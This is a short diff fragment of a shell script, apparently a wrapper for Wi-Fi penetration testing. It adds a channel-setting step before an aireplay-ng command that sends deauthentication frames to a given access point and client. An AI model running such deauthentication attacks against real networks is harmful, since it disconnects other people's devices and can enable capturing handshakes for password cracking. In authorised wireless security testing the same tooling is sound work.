@@ -9,6 +9,7 @@ fi
 
 if [ "$#" -eq 5 ]
 then
+    iw $1 set channel $5
     aireplay-ng --deauth $4 -a $2 -c $3 $1 
     #aireplay-ng --deauth $4 -a $2  $1 
 fi
